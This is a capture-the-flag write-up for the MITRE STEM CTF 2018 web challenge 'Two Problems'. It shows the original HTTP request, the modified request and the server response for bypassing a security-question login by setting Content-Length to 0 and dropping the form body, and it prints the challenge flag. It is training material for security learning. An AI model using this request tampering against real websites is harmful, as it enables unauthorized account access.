##mitrestemctf2018-writeups

**mitrestemctf.org --- Two Problems --- Web 100 points**

Description:

"I lost my phone and I can't log in to my favorite website. Can you help me get access?"

**Issue:**

Login auth is immediately presented with 2 security questions, the user doesn't know the answer to either question

**We need to gain access w/o knowing security questions**

**Recon:**

1 - Initial link provided points to: http://138.247.115.171/home
- This is a login page with a set of credentials that are provided
- User: DonutsAreG8
- Pass: butChocolateIsBetter

2 - upon login we are presented with 2 security questions: http://138.247.115.171/login/donutsAreGr8/butChocolateIsBetter

Let's take a look at the request headers to see what's being sent: 

--------------
POST /login/donutsAreGr8/butChocolateIsBetter HTTP/1.1
Host: 138.247.115.171
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.247.115.171/login/donutsAreGr8/butChocolateIsBetter
Connection: close
Upgrade-Insecure-Requests: 1 <--------- probably want to try setting this to 0 as well
Content-Type: application/x-www-form-urlencoded
Content-Length: 21 <----------- Content length is being passed in request headers

secQ1=1234&secQ2=1234 <--------- security question fields
----------------

**Hypothesis:** 
Intercept request, and modify "Content-Length" Header from 21 to 0, then forward request


**Resolution:**

1 - Use Chrome devtools to pull request headers initially to see how the web app responds to POST requests on the security questions page

2 - Once we have what *should* be in the request headers, run the same request in burpsuite (this can be done with curl as well from a shell, but it was faster to use burpsuite. Don't judge me)

3 - Intercept the POST for /login/donutsAreGr8/butChocolateIsBetter

4 - Modify the "Content-Length" header from "21" to "0"

5 - Modify the "Upgrade-Insecure-Requests" header from "1" to "0"

5 - Make sure to remove "secQ1=&secQ2=" from the payload (since the Content-Length 0 is now telling the web app to expect a 0 length payload)

6 - Forward request with modified header and payload to app. 

7 - App responds to request by letting us through past the security questions, and to waiting flag

8 - Profit :)

Request and response headers:

Original Request

POST /login/donutsAreGr8/butChocolateIsBetter HTTP/1.1
Host: 138.247.115.171
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.247.115.171/login/donutsAreGr8/butChocolateIsBetter
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

secQ1=&secQ2=


Modified Request

POST /login/donutsAreGr8/butChocolateIsBetter HTTP/1.1
Host: 138.247.115.171
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.247.115.171/login/donutsAreGr8/butChocolateIsBetter
Connection: close
Upgrade-Insecure-Requests: 0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

Response

HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Connection: close
Status: 200 OK
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Date: Sat, 21 Apr 2018 06:18:54 GMT
X-Powered-By: Phusion Passenger 5.2.3
Server: nginx/1.12.2 + Phusion Passenger 5.2.3
Content-Length: 122

<title>Welcome</title>
Welcome donutsAreGr8!<br>
As thanks for using our website please accept this flag, MCA{Igkqs1Pn5w}.
